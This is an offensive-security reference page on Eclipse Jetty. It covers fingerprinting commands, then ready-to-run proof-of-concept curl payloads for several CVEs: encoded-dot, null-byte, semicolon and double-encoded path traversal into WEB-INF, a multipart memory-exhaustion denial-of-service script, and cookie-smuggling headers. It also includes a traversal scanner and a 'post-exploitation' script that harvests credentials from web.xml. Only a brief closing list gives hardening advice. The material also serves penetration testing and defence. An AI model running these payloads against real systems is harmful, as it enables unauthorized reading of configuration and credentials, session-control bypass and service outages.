---
title: "Eclipse Jetty"
date: 2026-02-24
draft: false
---

## Overview

Eclipse Jetty is a widely deployed Java-based HTTP server and servlet container. It is commonly embedded in products such as Jenkins, SonarQube, Elasticsearch, and many enterprise Java applications. Jetty's long history has produced several significant path traversal vulnerabilities, particularly around URL encoding and request parsing, leading to unauthorized access to WEB-INF contents, web.xml files, and sensitive application configuration.

**Default Ports:**
| Port | Service |
|------|---------|
| 8080 | HTTP |
| 8443 | HTTPS |
| 8009 | AJP (if configured) |

---

## Recon and Fingerprinting

### Service Detection

```bash
nmap -sV -p 8080,8443 TARGET_IP
nmap -p 8080 --script http-headers,http-title,http-server-header TARGET_IP
```

### Version Fingerprinting

```bash
# Server header reveals Jetty version
curl -sv http://TARGET_IP:8080/ 2>&1 | grep -i "Server:"

# X-Powered-By header
curl -sv http://TARGET_IP:8080/ 2>&1 | grep -i "X-Powered-By"

# Error page fingerprinting
curl -s http://TARGET_IP:8080/nonexistent_page_12345 | grep -i jetty

# Robots.txt / sitemap
curl -s http://TARGET_IP:8080/robots.txt
curl -s http://TARGET_IP:8080/sitemap.xml
```

### Directory and Path Discovery

```bash
# Common Jetty paths
for path in "/" "/index.html" "/WEB-INF/" "/WEB-INF/web.xml" "/META-INF/" "/favicon.ico" "/.well-known/" "/test/" "/examples/" "/demo/"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://TARGET_IP:8080$path")
  echo "$CODE : http://TARGET_IP:8080$path"
done
```

---

## CVE-2021-28164 — Path Traversal

**CVSS:** 5.3 Medium
**Affected:** Jetty 9.4.37.v20210219 to 9.4.38.v20210224
**Type:** Path traversal in URI handling
**CWE:** CWE-22

### Vulnerability Details

This CVE is specifically about Jetty's failure to normalize a **single** encoded dot (`%2e`). When Jetty received a URI containing `%2e`, it did not decode and normalize the segment — meaning `%2e` was treated as a literal directory name rather than being collapsed to `.` (which would then be eliminated as a self-referencing segment). Security constraints in `web.xml` are checked against the normalized path, but Jetty was checking against the raw `%2e`-containing path, allowing constraint bypass.

The key distinction: this is NOT a double-dot traversal. It is a single-dot (`%2e`) normalization failure. The path `/context/%2e/WEB-INF/web.xml` should normalize to `/context/WEB-INF/web.xml`, which would be blocked by constraints. Instead, Jetty forwarded it to the resource handler without normalization, bypassing the constraint check.

Critically, `WEB-INF/web.xml` typically contains database credentials, internal endpoint configurations, servlet class names, and security role definitions.

### PoC

```bash
# Standard WEB-INF access (should be blocked — 403/404)
curl -v http://TARGET_IP:8080/WEB-INF/web.xml

# CVE-2021-28164 — single %2e normalization bypass (NOT double-dot traversal)
# The %2e is a single dot that Jetty fails to normalize
curl -v http://TARGET_IP:8080/%2e/WEB-INF/web.xml
curl -v http://TARGET_IP:8080/context/%2e/WEB-INF/web.xml

# With application context path
curl -v "http://TARGET_IP:8080/myapp/%2e/WEB-INF/web.xml"
curl -v "http://TARGET_IP:8080/myapp/%2e/WEB-INF/classes/application.properties"

# Verify the bypass — 200 means constraint was bypassed
for ctx in "" "/app" "/api" "/servlet" "/service" "/web" "/myapp"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://TARGET_IP:8080${ctx}/%2e/WEB-INF/web.xml")
  echo "$CODE : ${ctx}/%2e/WEB-INF/web.xml"
done
```

### What to Look For in web.xml

```bash
# Extract credentials and endpoints from web.xml
curl -s "http://TARGET_IP:8080/%2e/WEB-INF/web.xml" | grep -iE "password|username|secret|key|url|datasource|jdbc"

# Get application classes list
curl -s "http://TARGET_IP:8080/%2e/WEB-INF/web.xml" | grep -iE "servlet-class|filter-class"
```

---

## CVE-2021-34429 — Path Traversal Bypass

**CVSS:** 5.3 Medium
**Affected:** Jetty 9.4.x < 9.4.39, 10.0.x < 10.0.3, 11.0.x < 11.0.3
**Type:** Path traversal bypass using encoded null byte / Windows reserved chars
**CWE:** CWE-22

### Vulnerability Details

This CVE extends path traversal beyond the previous CVE. Jetty failed to normalize paths containing:
- Encoded null bytes (`%00`)
- Semicolons (`;`) as path segment delimiters
- Windows-style path separators
- Double-encoded characters

This allowed bypassing security constraints configured in `web.xml` that would otherwise block access to `WEB-INF` and `META-INF`.

### PoC

```bash
# Null byte bypass
curl -v "http://TARGET_IP:8080/WEB-INF/web.xml%00"
curl -v "http://TARGET_IP:8080/WEB-INF%00/web.xml"

# Semicolon bypass — Jetty may treat path after ; as parameters
curl -v "http://TARGET_IP:8080/WEB-INF;/web.xml"
curl -v "http://TARGET_IP:8080/WEB-INF/web.xml;"

# Windows path separator (unlikely on Linux but test in Windows env)
curl -v "http://TARGET_IP:8080/WEB-INF%5Cweb.xml"

# Combined with traversal from CVE-2021-28164
curl -v "http://TARGET_IP:8080/%2e/WEB-INF/web.xml%00"
curl -v "http://TARGET_IP:8080/%2e%2f/WEB-INF/web.xml"

# Try with different context paths
for ctx in "" "/app" "/api" "/servlet" "/service" "/web"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://TARGET_IP:8080${ctx}/%2e/WEB-INF/web.xml")
  echo "$CODE : ${ctx}/%2e/WEB-INF/web.xml"
done
```

---

## CVE-2021-28169 — Double Encoding Information Disclosure

**CVSS:** 5.3 Medium
**Affected:** Jetty 9.4.x < 9.4.39, 10.0.x < 10.0.3, 11.0.x < 11.0.3
**Type:** Double URL decoding leading to unintended resource access
**CWE:** CWE-116

### Vulnerability Details

This CVE specifically affects applications that use **ConcatServlet** — Jetty's built-in servlet for concatenating multiple static files (typically JavaScript and CSS bundles) into a single HTTP response. The double encoding exploit (`%252e`) only works when the application has ConcatServlet mapped and active (e.g., via the `jetty-servlets` module). This is a prerequisite: if the application does not use ConcatServlet, this specific attack path does not apply.

ConcatServlet decoded request paths twice before serving concatenated content. An attacker could request a double-encoded path to access resources that should have been protected by security constraints. The double-decoded path bypassed ACL checks that operated on only the once-decoded path.

### PoC

```bash
# Double-encoded slash: %252f = URL encoded "%2f" = URL encoded "/"
curl -v "http://TARGET_IP:8080/WEB-INF%252fweb.xml"
curl -v "http://TARGET_IP:8080/%252e/WEB-INF/web.xml"

# Double-encoded dot: %252e = URL encoded "%2e" = URL encoded "."
curl -v "http://TARGET_IP:8080/%252e%252e/WEB-INF/web.xml"

# Mixed encoding
curl -v "http://TARGET_IP:8080/%252e/WEB-INF%252fweb.xml"

# With context path
curl -v "http://TARGET_IP:8080/static/%252e%252e/WEB-INF/web.xml"
curl -v "http://TARGET_IP:8080/resources/%252e/WEB-INF/web.xml"

# Check if double encoding affects META-INF as well
curl -v "http://TARGET_IP:8080/WEB-INF%252fclasses%252fapplication.properties"
curl -v "http://TARGET_IP:8080/META-INF%252fMANIFEST.MF"
```

---

## CVE-2023-26048 — OutOfMemoryError via Multipart

**CVSS:** 5.3 Medium
**Affected:** Jetty 9.4.0 to 9.4.51, 10.0.0 to 10.0.14, 11.0.0 to 11.0.14, 12.0.0 to 12.0.0.beta2
**Type:** Denial of Service via malformed multipart request
**CWE:** CWE-400

### Vulnerability Details

The actual trigger is a multipart request containing a part with **no `filename` field** in the `Content-Disposition` header, combined with oversized content. When `fileSizeThreshold=0` was configured (meaning Jetty should write part content to disk immediately rather than buffering in memory), Jetty incorrectly loaded the entire part into memory anyway when the `filename` field was absent. This bypassed the disk-write threshold and could cause `OutOfMemoryError`.

**Affected versions note:** Jetty 12.x is only affected up to and including 12.0.0.beta2. Jetty 12.0.0 stable is not affected.

No authentication is required — any endpoint accepting multipart data is affected.

### PoC — DoS Trigger

```bash
# Send malformed multipart request with NO filename in Content-Disposition
# The missing filename field is the critical trigger — combined with large content body
# WARNING: This may cause memory exhaustion on the target service
curl -v -X POST "http://TARGET_IP:8080/upload-endpoint" \
  -H "Content-Type: multipart/form-data; boundary=boundary123" \
  --data-binary $'--boundary123\r\nContent-Disposition: form-data; name="file"\r\n\r\n'$(python3 -c "print('A'*5000000)")$'\r\n--boundary123--\r\n'

# Note: Content-Disposition has name="file" but NO filename="..." field
# This is what triggers the bug — Jetty does not write to disk, loads into memory

# Python PoC
python3 -c "
import requests
boundary = 'boundary123'
# Critical: name present, filename absent
part_header = f'--{boundary}\r\nContent-Disposition: form-data; name=\"file\"\r\n\r\n'
part_data = 'X' * 5000000
part_end = f'\r\n--{boundary}--\r\n'
body = part_header + part_data + part_end
headers = {'Content-Type': f'multipart/form-data; boundary={boundary}'}
try:
    r = requests.post('http://TARGET_IP:8080/any-form-endpoint', data=body.encode(), headers=headers, timeout=10)
    print(f'Response: {r.status_code}')
except Exception as e:
    print(f'Error (possible DoS triggered): {e}')
"
```

---

## CVE-2023-26049 — Cookie Parsing Unauthorized Information Leak

**CVSS:** 5.3 Medium
**Affected:** Jetty 9.4.0 to 9.4.51, 10.0.0 to 10.0.14, 11.0.0 to 11.0.14, 12.0.0 to 12.0.0.beta2
**Type:** Non-standard cookie handling leads to information disclosure
**CWE:** CWE-1286

### Vulnerability Details

This vulnerability is more precisely described as **Cookie Smuggling**, not merely an information disclosure. Jetty's cookie parser did not correctly handle unquoted cookie values containing special characters. When Nginx (or another reverse proxy) validates cookies differently from Jetty — due to Jetty accepting unquoted cookie values with embedded delimiters — an attacker can hide a `JSESSIONID` or other sensitive cookie inside a less-protected or lower-priority cookie field that Nginx passes through without scrutiny.

**Exploitation scenario:** If a proxy enforces security policies on cookies named `JSESSIONID` (e.g., requiring HttpOnly, Secure flags, or rejecting certain values), an attacker could embed a crafted session token inside a differently-named cookie with an unquoted value. Jetty would parse the embedded `JSESSIONID` out of the malformed cookie string, while the proxy's security policy never inspected it. This enables bypassing proxy-level session security controls.

### PoC

```bash
# Test basic cookie parsing behavior — Jetty may accept the smuggled value
curl -v http://TARGET_IP:8080/app/ \
  -H 'Cookie: session="validvalue"; injected=data; other=cookie'

# Cookie smuggling attempt — hide JSESSIONID inside another cookie's unquoted value
# Nginx sees 'trackingid' and does not validate JSESSIONID policy
# Jetty parses the embedded JSESSIONID from the malformed value
curl -v http://TARGET_IP:8080/app/ \
  -H 'Cookie: trackingid=abc123; JSESSIONID=SMUGGLED_SESSION_TOKEN'

# Check if extra data after closing quote is parsed differently
curl -v http://TARGET_IP:8080/app/ \
  -H 'Cookie: session="value"JSESSIONID=VALID_STOLEN_TOKEN'

# Observe response — if session is established via the smuggled token, bypass succeeded
```

The practical impact depends on the specific proxy configuration. In environments where Nginx enforces strict cookie policies (e.g., rejecting direct `JSESSIONID` values from untrusted sources), this bypass is a meaningful authentication/session control bypass.

---

## WEB-INF Disclosure — Impact Assessment

When WEB-INF is accessible (via any of the above CVEs), the following files are high-value targets:

```bash
# Core configuration
curl -s "http://TARGET_IP:8080/%2e/WEB-INF/web.xml"
curl -s "http://TARGET_IP:8080/%2e/WEB-INF/jetty-web.xml"
curl -s "http://TARGET_IP:8080/%2e/WEB-INF/jetty.xml"

# Spring configuration
curl -s "http://TARGET_IP:8080/%2e/WEB-INF/applicationContext.xml"
curl -s "http://TARGET_IP:8080/%2e/WEB-INF/spring/spring-security.xml"
curl -s "http://TARGET_IP:8080/%2e/WEB-INF/spring/root-context.xml"

# Properties files (often contain DB credentials)
curl -s "http://TARGET_IP:8080/%2e/WEB-INF/classes/application.properties"
curl -s "http://TARGET_IP:8080/%2e/WEB-INF/classes/application.yml"
curl -s "http://TARGET_IP:8080/%2e/WEB-INF/classes/database.properties"
curl -s "http://TARGET_IP:8080/%2e/WEB-INF/classes/config.properties"

# Hibernate / JPA config
curl -s "http://TARGET_IP:8080/%2e/WEB-INF/classes/hibernate.cfg.xml"
curl -s "http://TARGET_IP:8080/%2e/WEB-INF/classes/persistence.xml"

# Log4j / Logback config (may reveal internal paths)
curl -s "http://TARGET_IP:8080/%2e/WEB-INF/classes/log4j.properties"
curl -s "http://TARGET_IP:8080/%2e/WEB-INF/classes/logback.xml"
```

---

## Directory Listing

If directory browsing is enabled (Jetty `DefaultServlet` with `dirAllowed=true`):

```bash
# Check for directory listing
curl -s http://TARGET_IP:8080/ | grep -i "index of\|directory listing"

# Common directories to check
for dir in "/" "/static/" "/resources/" "/assets/" "/upload/" "/files/" "/images/" "/js/" "/css/"; do
  curl -s "http://TARGET_IP:8080$dir" | grep -q "Index of" && echo "[LISTING] $dir"
done
```

---

## Automated Scanning

### Nuclei Templates

```bash
# Run all Jetty-related nuclei templates
nuclei -u http://TARGET_IP:8080 -t cves/2021/CVE-2021-28164.yaml
nuclei -u http://TARGET_IP:8080 -t cves/2021/CVE-2021-34429.yaml
nuclei -u http://TARGET_IP:8080 -t cves/2021/CVE-2021-28169.yaml
nuclei -u http://TARGET_IP:8080 -t exposures/configs/jetty-web-inf.yaml

# Full scan
nuclei -u http://TARGET_IP:8080 -t technologies/jetty.yaml -t cves/ -tags jetty
```

### Bash Enumeration Script

```bash
#!/bin/bash
TARGET="http://TARGET_IP:8080"
CONTEXT="${1:-}" # optional context path

echo "[*] Jetty Path Traversal Scanner"
echo "[*] Target: $TARGET"

TRAVERSALS=(
    "%2e/WEB-INF/web.xml"
    "%2e%2e/WEB-INF/web.xml"
    "%2e%2f/WEB-INF/web.xml"
    "WEB-INF%252fweb.xml"
    "%252e/WEB-INF/web.xml"
    "%252e%252e/WEB-INF/web.xml"
    "WEB-INF;/web.xml"
    "WEB-INF/web.xml%00"
    "%2e/WEB-INF/web.xml%00"
)

for traversal in "${TRAVERSALS[@]}"; do
    URL="$TARGET/$CONTEXT/$traversal"
    RESPONSE=$(curl -s -o /tmp/jetty_test -w "%{http_code}" "$URL")
    if [[ "$RESPONSE" == "200" ]]; then
        SIZE=$(wc -c < /tmp/jetty_test)
        echo "[+] HIT ($RESPONSE, ${SIZE}B): $URL"
        head -20 /tmp/jetty_test
    else
        echo "[-] $RESPONSE : $URL"
    fi
done
```

---

## Post-Exploitation — Extracting Credentials from web.xml

```python
#!/usr/bin/env python3
"""Parse web.xml for credentials and sensitive configuration."""
import sys
import re
import requests
from xml.etree import ElementTree as ET

TARGET = "http://TARGET_IP:8080"
TRAVERSALS = ["%2e/WEB-INF/web.xml", "%252e/WEB-INF/web.xml", "WEB-INF%252fweb.xml"]

for traversal in TRAVERSALS:
    url = f"{TARGET}/{traversal}"
    try:
        r = requests.get(url, timeout=10)
        if r.status_code == 200 and len(r.text) > 100:
            print(f"[+] Got web.xml via: {url}")
            content = r.text

            # Grep for sensitive data
            patterns = {
                'Password': r'(?i)password[^>]*>([^<]+)',
                'Username': r'(?i)username[^>]*>([^<]+)',
                'JDBC URL': r'jdbc:[^\s<"]+',
                'Context Init': r'<param-name>([^<]+)</param-name>\s*<param-value>([^<]+)</param-value>',
                'Security Role': r'<role-name>([^<]+)</role-name>',
                'Servlet Mapping': r'<servlet-name>([^<]+)</servlet-name>',
            }
            for name, pattern in patterns.items():
                matches = re.findall(pattern, content)
                if matches:
                    print(f"  [{name}]: {matches}")
            break
    except Exception as e:
        print(f"[-] Failed {url}: {e}")
```

---

## Hardening Recommendations

- Upgrade Jetty to 9.4.52+, 10.0.15+, 11.0.15+, or 12.0.1+
- Ensure security constraints in `web.xml` use proper patterns
- Disable `DefaultServlet` directory listing (`dirAllowed=false`)
- Restrict access to WEB-INF and META-INF at the reverse proxy level
- Enable `HttpOnly` and `Secure` flags on all session cookies
- Use a WAF rule to block encoded dot-segment traversal attempts
- Keep Jetty updated — this vulnerability class has recurred multiple times
